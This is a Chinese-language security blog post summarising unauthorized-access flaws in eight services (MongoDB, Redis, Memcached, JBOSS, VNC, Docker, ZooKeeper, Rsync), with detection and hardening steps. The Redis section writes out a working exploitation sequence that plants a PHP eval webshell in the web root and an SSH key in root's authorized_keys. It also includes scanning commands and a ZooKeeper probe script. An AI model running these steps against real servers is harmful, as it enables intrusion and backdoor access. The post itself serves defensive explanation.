---
layout: post_layout
title: 未授权访问漏洞总结
time: 2019年07月02日 星期二
location: 杭州
pulished: true
excerpt_separator: "常见的未授权访问漏洞："
---
之前因为毕设毕业答辩毕业典礼之类的事儿耽搁了博客更新。不过总算是毕业了，太不容易了[捂脸]。当初想借着上一篇的余热总结一下常见的未授权漏洞的，结果一拖就拖了一个多月，都已经拖凉了。。

未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。

常见的未授权访问漏洞：

1. MongoDB 未授权访问漏洞

2. Redis 未授权访问漏洞

3. Memcached 未授权访问漏洞（CVE-2013-7239）

4. JBOSS 未授权访问漏洞

5. VNC 未授权访问漏洞

6. Docker 未授权访问漏洞

7. ZooKeeper 未授权访问漏洞

8. Rsync 未授权访问漏洞

---

### 1 MongoDB 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：开启 MongoDB 服务时若不添加任何参数，默认是没有权限验证的，而且可以远程访问数据库，登录的用户无需密码即可通过默认端口 **27017** 对数据库进行增、删、改、查等高危操作。刚安装完毕时，MongoDB 都默认有一个 admin 数据库，此时 admin 数据库为空，没有记录权限相关的信息。当 admin.system.users 一个用户都没有时，即使 MongoDB 启动时添加了 --auth 参数，还是可以做任何操作（不管是否以 --auth 参数启动），直到在 admin.system.users 中添加了一个用户。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：MongoDB 数据库。

---

#### 检测方法

可以自己编制相应脚本或利用专用工具检测，也可以查看配置文件：

(1) 检测是否仅监听 127.0.0.1：

```
--bind_ip 127.0.0.1
or
vim /etc/mongodb.conf
bind_ip = 127.0.0.1
```

(2) 检测是否开启 auth 认证：

```
mongod --auth
or
vim /etc/mongodb.conf
auth = true
```

---

#### 修复方法

(1) 为 MongoDB 添加认证：

① MongoDB 启动时添加 -auth 参数。

② 给 MongoDB 添加用户：

```
use admin # 使用 admin 库；
db.addUser（“用户名” “密码”）# 添加用户名、密码；
db.auth（“用户名”,“密码”）# 验证是否添加成功，返回 1 说明成功。
```

(2) 禁用 HTTP 和 REST 端口：

MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务，一般不需要通过 Web 方式进行远程管理，建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数 nohttpinterface = false。

(3) 限制绑定 IP：

启动时加入参数：`--bind_ip 127.0.0.1` 或在 /etc/mongodb.conf 文件中添加以下内容：`bind_ip = 127.0.0.1`  

---

### 2 Redis 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：Redis 是一个高性能的 Key - Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足，在部分场合可以对关系数据库起到很好的补充作用。Redis 默认情况下，会绑定在 0.0.0.0:**6379**，这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下，会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，成功地在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：Redis 数据库。

---

#### 检测方法

先用 nmap 扫描，查看端口开放情况，发现开放的 6379 端口为 Redis 的默认端口：`Nmap -A -p 6379 --script redis-info 192.168.10.153`

Nmap 扫描后发现主机的 6379 端口对外开放，可以通过 Redis 客户端进行连接，测试是否存在未授权访问漏洞，具体命令如下：

```
./redis-cli -h 192.168.10.153
Info
```

就可以看到 Redis 的版本和服务器上内核的版本信息，也可以 del key 删除数据，在网站写入木马，写入 SSH 公钥，或者在 crontab 里写定时任务，反弹 shell 等。

(1) 网站写码：

① 先用客户端连接服务器的 redis 服务：`redis-cli.exe -h 目标IP`

② 连接后设置目录：`config set dir /var/www/html（此路径是服务器端 Web 网站的目录）`

③ 设置要写入的文件名：`config set dbfilename redis88.php`

④ 设置要写入的内容：`set webshell "<?php @eval($_POST['123']); ?>"`

⑤ 保存：`save`

⑥ 保存后用菜刀连接此木马得到 webshell。

(2) 结合 SSH 免密码登录：

① 先在本地建个 ssh 的密钥：`ssh-keygen-trsa`

② 将公钥的内容写到一个文本中，命令如下：`(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt`

注意：写到文件中时一定要在前面加几行后面加几行。

③ 将里面的内容写入远程的 Redis 服务器上，并且设置其 Key 为 test，命令如下：`cat test.txt | redis -cli -h <hostname> -x set test`

④ 登录远程服务器，可以看到公钥已经添加到 Redis 的服务器上了，命令如下：

```
redis-cli -h <hostname>
keys *
get test
```
⑤ 随后就是最关键的了，Redis 有个 save 命令：save 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照（snapshot）以 RDB 文件的形式保存到硬盘。所以，save 命令就可以将 test 里的公钥保存到 /root/.ssh 下（要有权限）。

修改保存的路径为 `config set dir "/root/.ssh"`修改文件名为 `config set dbfilename "authorized_keys"`保存。

⑥ 测试一下：`ssh 用户名@<IP地址>`实现免密码成功登陆。

---

#### 修复方法

(1) 设置 Redis 访问密码，在 redis.conf 中找到 "requirepass" 字段，在后面填上强口令，redis 客户端也需要此密码来访问 redis 服务。

(2) 配置 bind 选项，限定可以连接 Reids 服务器的 IP，并修改默认端口 6379。

(3) 重启 Redis 服务。

(4) 清理系统中存在的后门木马。

---

### 3 Memcached 未授权访问漏洞（CVE-2013-7239）

---

#### 漏洞信息

(1) 漏洞简述：Memcached 是一套分布式高速缓存系统。它以 Key - Value 的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度，所以可以用来加速应用的访问。由于 Memcached 的安全设计缺陷，客户端连接 Memcached 服务器后无需认证就可读取、修改服务器缓存内容。

(2) 风险等级：高风险。

(3) 漏洞编号：CVE-2013-7239 。

(4) 影响范围：Memcached 全版本。

---

#### 检测方法

登录机器执行 netstat -an | more 命令，查看端口监听情况。回显 0.0.0.0:**11211**：11211 表示在所有网卡进行监听，存在 Memcached 未授权访问漏洞。

```
telnet <target> 11211
or
nc -vv <target> 11211
```

提示连接成功表示漏洞存在。

使用端口扫描工具 nmap 进行远程扫描：`nmap -sV -p11211 --script memcached-info <target>` 

---

#### 修复方法

(1) 配置访问控制。建议用户不要将服务发布到互联网上，以防被黑客利用，而可以通过安全组规则或 Iptables 配置访问控制规则只允许内部必需的用户地址访问，命令如下：`iptables -A INPUT -p tcp -s 192.168.0.2 --dport 11211 -j ACCEPT`

(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要，可在 Memcached 启动时指定绑定的 IP 地址为 127.0.0.1。例如：`memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid`

(3) 最小化权限运行。使用普通权限账号运行，以下指定 memcached 用户运行：`memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid`

(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口：`memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid`

(5) 备份数据。为避免数据丢失，升级前应做好备份，或建立硬盘快照。

---

### 4 JBOSS 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：JBOSS 企业应用平台（EAP）是 J2EE 应用的中间件平台。默认情况下访问 http://ip:**8080**/jmx-console 就可以浏览 jboss 的部署管理的信息，不需要输入用户名和密码，可以直接部署上传木马，有安全隐患。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：JBOSS 全版本。

---

#### 检测方法

先用 nmap 扫描，查看端口开放情况，看是否开放 JBOSS 端口。再使用漏洞测试工具，测试 jmx 组件存在情况，通过访问 http://ip:jboss端口/ 看是否能进入 jmx-console 和 web-console 。

---

#### 修复方法

(1) JMX Console 安全配置：

① 找到 %JBOSS_HOME%/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml 文件，去掉下面这段 xml 文本的注释。

![JML Console 安全配置 1](https://images2018.cnblogs.com/blog/1275435/201804/1275435-20180426182248019-1571137611.png)

② 与 jboss-web.xml 同级的目录下还有一个文件 web.xml，找到下面这段 xml 文本，把 GET 和 POST 两行注释掉，同时 security-constraint 整个部分取消注释,**不然存在head头绕过**。

![JML Console 安全配置 2](https://images2018.cnblogs.com/blog/1275435/201804/1275435-20180426183107445-636697233.png)

③ %JBOSS_HOME%\server\default\conf\props\jbossws-users.properties 中，删除原始的 admin/admin，添加新的用户名密码。

![JML Console 安全配置 3](https://images2018.cnblogs.com/blog/1275435/201804/1275435-20180426183714171-674693678.png)

④ %JBOSS_HOME%\server\default\conf\props\jbossws-roles.properties 中，定义新用户名所属角色。该文件定义的格式为：用户名 = 角色，多个角色以 “,” 隔开，该文件默认为 admin 用户定义了 JBossAdmin 和 HttpInvoker 这两个角色。 

```
# A sample roles.properties file foruse with the UsersRolesLoginModule
kermit = JBossAdmin,HttpInvoker
```

### 5 VNC 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：VNC 是虚拟网络控制台（Virtual Network Console）的英文缩写。它是一款优秀的远程控制工具软件，由美国电话电报公司（AT&T）的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件，由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 **5900**、**5901**。VNC 未授权访问漏洞如被利用，可能造成恶意用户直接控制受控主机，危害相当严重。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：VNC 全版本。

---

#### 检测方法

使用 metasploit 进行批量检测：

(1)  在 kali 下运行 msfconsole：msfconsole。

(2) 调用 VNC 未授权检测模块：use auxiliary/scanner/vnc/vnx_none_auth。

(3) 显示有哪些选项：show options。

(4) 设置地址段：set rhosts ip 或 段。

(5) 设置线程：set threads 50。

(6) 开始扫描：run。

---

#### 修复方法

(1) 配置 VNC 客户端登录口令认证，并配置符合密码强度要求的密码。

(2) 以最小权限的普通用户身份运行操作系统。

---

### 6 Docker 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：Docker 是一个开源的引擎，可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署，包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台，Docker 存在问题的版本分别为 1.3 和 1.6，因为权限控制等问题导致可以脱离容器拿到宿主机权限。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：Docker 1.3、Docker 1.6。

---

#### 检测方法

先用 nmap 扫描，查看端口开放情况。**2375** 为 docker 端口，如果存在漏洞会有以下情况：url 输入 ip:2375/version 就会列出基本信息，也可以执行目标服务器容器命令，如 container、image 等。

---

#### 修复方法

(1) 使用 TLS 认证。

(2) 网络访问控制（Network Access Control）

---

### 7 ZooKeeper 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：ZooKeeper 是一个分布式的，开放源码的分布式应用程序协调服务，是 Google 的 Chubby 一个开源的实现，是 Hadoop 和 Hbase 的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper 默认开启在 **2181** 端口，在未进行任何访问控制的情况下，攻击者可通过执行 envi 命令获得系统大量的敏感信息，包括系统名称，Java 环境。这将导致任意用户在网络可达的情况下进行为未授权访问，并读取数据甚至 kill 服务。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：Zookeeper 全版本。

---

#### 检测方法

(1) 通过 nmap 扫描开放了 2181 端口的主机。

(2) 运行脚本，通过 socket 连接 2181 端口并发送 envi 命令，若服务端返回的数据中包含 ZooKeeper 的服务运行环境信息，即可证明存在未授权访问。

检测脚本：

```
# coding=utf-8
 
import socket
import sys
 
def check(ip, port, timeout, cmd):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send(cmd)
        data = s.recv(1024)
        s.close()
        print data
    except:
        pass

def main():
    if len(sys.argv) < 3:
        exit()
    ip = sys.argv[1]
    cmd = sys.argv[2]
    # envi
    # dump
    # reqs
    # ruok
    # stat
    check(ip, 2181, 3, cmd)
 
if __name__ == '__main__':
    main()
```

---

#### 修复方法

(1) 修改 ZooKeeper 默认端口，采用其他端口服务，配置服务来源地址限制策略。

(2) 增加 ZooKeeper 的认证配置。

---

### 8 Rsync 未授权访问漏洞

---

#### 漏洞信息

(1) 漏洞简述：Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 **837**。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：Rsync 全版本。

---

#### 检测方法

nmap 扫描：nmap ip -p837。

列出当前目录，显示用户：rsync ip。

如果是root，可以下载任意文件并上传文件。

---

#### 修复方法

(1) 隐藏 module 信息：修改配置文件 list =false。

(2) 权限控制：不需要写入权限的 module 的设置为只读 Read only = true。

(3) 网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问：hosts allow = 123.123.123.123。

(4) 账户认证：只允许指定的用户利用指定的密码使用 rsync 服务。

(5) 数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh。